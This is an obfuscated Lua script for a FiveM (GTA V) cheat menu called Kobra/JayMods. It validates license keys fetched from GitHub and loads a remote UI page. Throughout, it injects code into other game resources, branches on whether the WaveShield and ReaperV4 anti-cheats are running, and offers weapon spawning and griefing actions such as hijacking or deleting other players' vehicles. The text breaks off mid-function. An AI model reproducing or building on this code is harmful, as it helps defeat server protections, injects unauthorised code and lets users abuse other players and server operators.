MachoLockLogger(3 -2 );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=0 -0 ;local v122;while true do if (v121==0) then v122="";for v673=1 + 0 , #v119 do local v674=string.byte(v119,v673);v122=v122   .. string.char((v674-v120)%(1137 -(614 + 267)) ) ;end v121=1;end if (v121==(33 -(19 + 13))) then if DEBUG then local v748={};for v823=1, #v122 do v748[v823]=string.byte(v122,v823);end print("[KOBRA Safety] Decoded secret: "   .. table.concat(v748,",") );end return v122;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=0 -0 ;local v124;while true do if (v123==(0 -0)) then v124=GetCloudTimeAsInt();return ((v124>(0 -0)) and v124) or (0 + 0) ;end end end local function v7(v125) local v126=0 -0 ;local v127;local v128;local v129;local v130;local v131;local v132;local v133;while true do if (v126==2) then return (v133 * (179180 -92780)) + (tonumber(v130) * 3600) + (tonumber(v131) * 60) + tonumber(v132) ;end if (v126==(1813 -(1293 + 519))) then if  not v127 then return nil;end v133=((tonumber(v127) -1970) * (744 -379)) + math.floor((tonumber(v127) -1969)/(9 -5) ) + ((tonumber(v128) -(1 -0)) * (129 -99)) + tonumber(v129) ;v126=2;end if (0==v126) then if (type(v125)~="string") then return nil;end v127,v128,v129,v130,v131,v132=string.match(v125,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v126=2 -1 ;end end end local function v8() local v134=0;local v135;local v136;local v137;while true do if (v134==(2 + 0)) then for v675,v676 in ipairs(v136) do if ((type(v676)=="table") and (v676.key==v4)) then if (v676.expires and (type(v676.expires)=="string")) then local v971=0 + 0 ;local v972;while true do if (v971==(2 -1)) then if (v972>v137) then return true,"Key valid (not expired)",v972;else return false,"Key expired",v972;end break;end if (v971==(0 + 0)) then v972=v7(v676.expires);if  not v972 then return false,"Bad expiry format";end v971=1 + 0 ;end end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end if (v134==(0 + 0)) then if  not v3 then return false,"No key list available";end v135,v136=pcall(json.decode,v3);v134=1097 -(709 + 387) ;end if (v134==(1859 -(673 + 1185))) then if ( not v135 or  not v136 or (type(v136)~="table")) then return false,"Key list invalid";end v137=v6();v134=5 -3 ;end end end local v9,v10,v11=v8();if  not v9 then local v320=0 -0 ;while true do if (v320==(0 -0)) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v11 and (v11>0)) then local v503=0;local v504;local v505;while true do if (v503==1) then if (v505>(0 + 0)) then local v861=math.floor(v505/(64559 + 21841) );local v862=math.floor((v505%(116653 -30253))/3600 );local v863=string.format("Your key is valid. Expires in %d days and %d hours.",v861,v862);MachoMenuNotification("KOBRA",v863,5);else MachoMenuNotification("KOBRA","Key expired.",3 + 7 );end break;end if (v503==(0 -0)) then v504=v6();v505=v11-v504 ;v503=1 -0 ;end end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",1885 -(446 + 1434) );end end);local v12={};local v13=false;local v14=nil;local v15=1;local v16={};local v17=v16;local v18=nil;local v19=1;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=1284 -(1040 + 243) ;local v35=2 -1 ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1 + 0 ;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[20 + 7 ]="Escape",[112]="F1",[113]="F2",[96 + 18 ]="F3",[113 + 2 ]="F4",[549 -(153 + 280) ]="F5",[337 -220 ]="F6",[118]="F7",[119]="F8",[108 + 12 ]="F9",[121]="F10",[122]="F11",[49 + 74 ]="F12",[101 + 91 ]="`",[45 + 4 ]="1",[37 + 13 ]="2",[51]="3",[78 -26 ]="4",[33 + 20 ]="5",[721 -(89 + 578) ]="6",[40 + 15 ]="7",[115 -59 ]="8",[57]="9",[1097 -(572 + 477) ]="0",[189]="-",[26 + 161 ]="=",[5 + 3 ]="Backspace",[9]="Tab",[10 + 71 ]="Q",[87]="W",[69]="E",[168 -(84 + 2) ]="R",[137 -53 ]="T",[65 + 24 ]="Y",[927 -(497 + 345) ]="U",[73]="I",[3 + 76 ]="O",[80]="P",[38 + 181 ]="[",[1554 -(605 + 728) ]="]",[220]="\\",[20]="CapsLock",[65]="A",[60 + 23 ]="S",[151 -83 ]="D",[70]="F",[71]="G",[4 + 68 ]="H",[273 -199 ]="J",[68 + 7 ]="K",[210 -134 ]="L",[141 + 45 ]=";",[711 -(457 + 32) ]="'",[6 + 7 ]="Enter",[1418 -(832 + 570) ]="Shift",[85 + 5 ]="Z",[88]="X",[67]="C",[86]="V",[66]="B",[21 + 57 ]="N",[77]="M",[665 -477 ]=",",[92 + 98 ]=".",[191]="/",[813 -(588 + 208) ]="Control",[123 -77 ]="Delete",[33]="PageUp",[1834 -(884 + 916) ]="PageDown",[73 -38 ]="End",[36]="Home",[38]="ArrowUp",[24 + 16 ]="ArrowDown",[37]="ArrowLeft",[39]="ArrowRight"};local v45={[27]=975 -(232 + 421) ,[2001 -(1569 + 320) ]=71 + 217 ,[113]=55 + 234 ,[383 -269 ]=775 -(316 + 289) ,[115]=436 -269 ,[116]=8 + 158 ,[117]=167,[1571 -(666 + 787) ]=593 -(360 + 65) ,[112 + 7 ]=423 -(79 + 175) ,[189 -69 ]=44 + 12 ,[370 -249 ]=109 -52 ,[1021 -(503 + 396) ]=525 -(92 + 89) ,[237 -114 ]=177 + 168 ,[114 + 78 ]=951 -708 ,[7 + 42 ]=357 -200 ,[44 + 6 ]=76 + 82 ,[155 -104 ]=160,[52]=21 + 143 ,[80 -27 ]=1409 -(485 + 759) ,[124 -70 ]=1348 -(442 + 747) ,[55]=1296 -(832 + 303) ,[1002 -(88 + 858) ]=50 + 112 ,[48 + 9 ]=7 + 156 ,[48]=871 -(766 + 23) ,[933 -744 ]=114 -30 ,[187]=218 -135 ,[27 -19 ]=1250 -(1036 + 37) ,[7 + 2 ]=71 -34 ,[81]=35 + 9 ,[87]=32,[69]=1526 -(641 + 839) ,[995 -(910 + 3) ]=45,[84]=624 -379 ,[1773 -(1466 + 218) ]=114 + 132 ,[1233 -(556 + 592) ]=108 + 195 ,[881 -(329 + 479) ]=928 -(174 + 680) ,[271 -192 ]=411 -212 ,[80]=5 + 2 ,[219]=778 -(396 + 343) ,[20 + 201 ]=1517 -(29 + 1448) ,[220]=1425 -(135 + 1254) ,[20]=515 -378 ,[65]=158 -124 ,[56 + 27 ]=1560 -(389 + 1138) ,[642 -(102 + 472) ]=30,[67 + 3 ]=28 + 21 ,[67 + 4 ]=1592 -(320 + 1225) ,[72]=131 -57 ,[46 + 28 ]=311,[1539 -(157 + 1307) ]=311,[1935 -(821 + 1038) ]=17 -10 ,[21 + 165 ]=143 -62 ,[83 + 139 ]=82,[13]=18,[39 -23 ]=1047 -(834 + 192) ,[6 + 84 ]=6 + 14 ,[88]=2 + 71 ,[103 -36 ]=330 -(300 + 4) ,[86]=0,[66]=8 + 21 ,[78]=249,[201 -124 ]=606 -(112 + 250) ,[75 + 113 ]=82,[475 -285 ]=47 + 34 ,[99 + 92 ]=63 + 20 ,[9 + 8 ]=27 + 9 ,[46]=1592 -(1001 + 413) ,[33]=22 -12 ,[916 -(244 + 638) ]=704 -(627 + 66) ,[104 -69 ]=815 -(512 + 90) ,[1942 -(1665 + 241) ]=213,[755 -(373 + 344) ]=27,[40]=173,[17 + 20 ]=174,[39]=47 + 128 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v138) MachoInjectResource("any",v138);end v12.Debug=function(v139,v140,v141) local v142=0 -0 ;local v143;local v144;while true do if (v142==0) then v143={red="^1",yellow="^3",green="^2",info="^5"};v144=v143[v140] or "^5" ;v142=1 -0 ;end if ((1100 -(35 + 1064))==v142) then print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v144,v141));break;end end end;v12.SendMessage=function(v145,v146) if (v14 and v146) then MachoSendDuiMessage(v14,json.encode(v146));end end;v12.Notify=function(v147,v148,v149,v150,v151) v147:SendMessage({action="showNotification",type=v148,title=v149,desc=v150,duration=v151});end;v12.GetMenuPath=function(v152) local v153=0 + 0 ;local v154;while true do if (v153==(0 -0)) then v154={"Kobra"};for v677=1, #v21 do table.insert(v154,v21[v677]);end v153=1 + 0 ;end if (v153==(1237 -(298 + 938))) then return v154;end end end;v12.UpdateElements=function(v155,v156) local v157=1259 -(233 + 1026) ;local v158;while true do if (v157==0) then if ( not v156 or (type(v156)~="table")) then return;end v158={action="updateElements",elements=v156,index=v15-(1667 -(636 + 1030)) ,path=v155:GetMenuPath()};v157=1 + 0 ;end if (v157==(1 + 0)) then if (v18 and (type(v18)=="table") and ( #v18>(0 + 0))) then v158.categories=v18;v158.categoryIndex=(v19 or 1) -(1 + 0) ;end v155:SendMessage(v158);break;end end end;v12.Initialize=function(v159) local v160="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/00000.html";v14=MachoCreateDui(v160);if v14 then local v506=221 -(55 + 166) ;while true do if (v506==(1 + 0)) then v159:Debug("green","Kobra UI loaded successfully!");break;end if (v506==(0 + 0)) then v159:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v506=3 -2 ;end end else v159:Debug("red","Failed to load Kobra UI!");end end;v12.HideUI=function(v161,v162) local v163=297 -(36 + 261) ;while true do if (v163==(1 -0)) then v161:SendMessage({action="keydown",index=0});v161:SendMessage({action="showUI",visible=false,index=1368 -(34 + 1334) });break;end if (v163==0) then if v162 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v163=1 + 0 ;end end end;v12.SendMessage=function(v164,v165) if ( not v14 or  not v165 or (type(v165)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v165));end;v12.ShowUI=function(v166) v13=true;local v167={action="showUI",visible=true,elements=v17,index=v15-1 ,path=v166:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};if (v18 and ( #v18>0)) then v167.categories=v18;v167.categoryIndex=v19-(1 + 0) ;end v166:SendMessage(v167);end;v12.UpdateElements=function(v168,v169) if ( not v169 or (type(v169)~="table")) then return;end local v170={action="updateElements",elements=v169,index=v15-(1284 -(1035 + 248)) ,path=v168:GetMenuPath(),header="JayMods"};if (v18 and ( #v18>(21 -(20 + 1)))) then v170.categories=v18;v170.categoryIndex=(v19 or (1 + 0)) -(320 -(134 + 185)) ;end v168:SendMessage(v170);end;v12.IsShiftHeld=function(v171) return v26;end;MachoOnKeyDown(function(v172) if ((v172==(1149 -(549 + 584))) or (v172==160) or (v172==(846 -(314 + 371)))) then v26=true;end end);MachoOnKeyUp(function(v173) if ((v173==(54 -38)) or (v173==(1128 -(478 + 490))) or (v173==(86 + 75))) then v26=false;end end);local v59=nil;local function v60(v174,v175,v176,v177) local v178=0;while true do if (v178==(1174 -(786 + 386))) then Wait(809 -559 );v12:HideUI(true);v178=3;end if (v178==(1382 -(1055 + 324))) then v24=false;break;end if (v178==(1340 -(1093 + 247))) then if v59 then return;end v59={title=v174,buffer=v175 or "" ,maxLength=29 + 3 ,onConfirm=v176,type=v177 or "typeable" ,closeable=((v177=="keybind") and false) or true ,active=true};v178=1 + 0 ;end if (v178==(3 -2)) then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v174,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end v178=6 -4 ;end end end MachoOnKeyDown(function(v179) if ( not v59 or  not v59.active) then return;end if (v179==13) then local v511=0 -0 ;while true do if (v511==(4 -2)) then v59=nil;v24=true;v511=3;end if (v511==0) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v511=1 + 0 ;end if (v511==(3 -2)) then if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v511=2;end if (v511==(10 -7)) then return;end end elseif (v179==8) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(1 + 0 , -(4 -2));else v59.buffer="";end elseif (v179==(715 -(364 + 324))) then local v827=0;while true do if (v827==(7 -4)) then return;end if ((0 -0)==v827) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v827=1 + 0 ;end if (v827==2) then v59=nil;v24=true;v827=12 -9 ;end if (v827==(1 -0)) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v827=5 -3 ;end end elseif (v59.type=="keybind") then local v973=1268 -(1249 + 19) ;local v974;while true do if (v973==(0 + 0)) then v974=v44[v179];if v974 then if (v59.buffer~=v974) then v59.buffer=v974;end end break;end end elseif (v59.type=="typeable") then local v1120=0;local v1121;local v1122;while true do if (1==v1120) then if (v1122 and ( #v59.buffer<v59.maxLength)) then if v12:IsShiftHeld() then if v1122:match("%a") then v1122=v1122:upper();elseif (v1122=="-") then v1122="_";end elseif v1122:match("%a") then v1122=v1122:lower();end v59.buffer=v59.buffer   .. v1122 ;end break;end if (v1120==(0 -0)) then v1121={[48]="0",[1135 -(686 + 400) ]="1",[50]="2",[51]="3",[41 + 11 ]="4",[282 -(73 + 156) ]="5",[1 + 53 ]="6",[866 -(721 + 90) ]="7",[1 + 55 ]="8",[184 -127 ]="9",[535 -(224 + 246) ]="A",[106 -40 ]="B",[123 -56 ]="C",[13 + 55 ]="D",[2 + 67 ]="E",[52 + 18 ]="F",[140 -69 ]="G",[239 -167 ]="H",[586 -(203 + 310) ]="I",[2067 -(1238 + 755) ]="J",[75]="K",[6 + 70 ]="L",[1611 -(709 + 825) ]="M",[143 -65 ]="N",[79]="O",[116 -36 ]="P",[945 -(196 + 668) ]="Q",[323 -241 ]="R",[171 -88 ]="S",[84]="T",[918 -(171 + 662) ]="U",[86]="V",[180 -(4 + 89) ]="W",[88]="X",[89]="Y",[315 -225 ]="Z",[69 + 120 ]="-",[187]="=",[188]=",",[190]=".",[816 -630 ]=";",[88 + 134 ]="'",[1677 -(35 + 1451) ]="/",[1645 -(28 + 1425) ]="`",[2025 -(941 + 1052) ]=" "};v1122=v1121[v179];v1120=1;end end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do local v321=0 + 0 ;while true do if (v321==(1514 -(822 + 692))) then Wait(0 -0 );if (v59~=nil) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);for v864=0 + 0 ,654 -(45 + 252)  do if ((v864<(48 + 0)) or (v864>(31 + 59))) then DisableControlAction(0 -0 ,v864,true);end end else Wait(933 -(114 + 319) );end break;end end end end);v12.ScrollOne=function(v180,v181) if ( not v181 or ( #v17==0)) then return;end local v182=0 -0 ;repeat if (v181=="Up") then v15=v15-(1 -0) ;if (v15<(1 + 0)) then v15= #v17;end elseif (v181=="Down") then local v752=0 -0 ;while true do if ((0 -0)==v752) then v15=v15 + (1964 -(556 + 1407)) ;if (v15> #v17) then v15=1207 -(741 + 465) ;end break;end end end v182=v182 + (466 -(170 + 295)) ;if (v182>(106 + 94)) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v180:SendMessage({action="keydown",index=v15-(1 + 0) });end end;v12.ScrollTwo=function(v183,v184) local v185=0 -0 ;local v186;while true do if (v185==1) then if (((v186.type=="scrollable") or (v186.type=="scrollable-checkbox")) and v186.values and ( #v186.values>(0 + 0))) then v186.value=v186.value or 1 ;if (v184=="Left") then v186.value=v186.value-1 ;if (v186.value<1) then v186.value= #v186.values;end elseif (v184=="Right") then v186.value=v186.value + 1 + 0 ;if (v186.value> #v186.values) then v186.value=1;end end v183:UpdateElements(v17);if ((v186.scrollType=="onScroll") and v186.onSelect) then if (v186.type=="scrollable-checkbox") then v186.onSelect(v186.values[v186.value],v186.checked or false );else v186.onSelect(v186.values[v186.value]);end end elseif ((v186.type=="slider") or (v186.type=="slider-checkbox")) then local v866=0 + 0 ;local v867;while true do if (v866==(1230 -(957 + 273))) then v186.value=v186.value or v186.min or 0 ;v867=v186.step or (1 + 0) ;v866=1;end if (v866==2) then v183:UpdateElements(v17);if 